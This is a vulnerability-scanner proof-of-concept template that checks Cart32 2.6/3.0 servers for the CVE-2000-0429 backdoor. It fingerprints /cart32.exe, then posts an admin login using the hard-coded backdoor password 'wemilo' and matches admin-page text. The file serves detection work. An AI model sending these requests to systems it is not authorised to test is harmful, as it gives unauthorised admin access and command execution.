[info]
author = "ave"
description = "验证 Cart32 2.6/3.0 后门密码 'wemilo' 是否存在，可导致远程管理后台访问及任意命令执行"
id = "POC-AVE-2000-0352"
name = "CVE-2000-0429 PoC"
severity = "high"
tags = ["ave-2000-0352"]
vuln_id = [
    "CVE-2000-0429",
    "AVE-2000-0352",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cart32.exe"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Cart32"]

[[poc.requests]]
method = "POST"
path = "/cart32.exe"
protocol = "http"

[poc.requests.body]
content = "UserName=admin&Password=wemilo&Submit=Login"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Administration",
    "admin",
    "Cart32 Admin",
    "Welcome",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
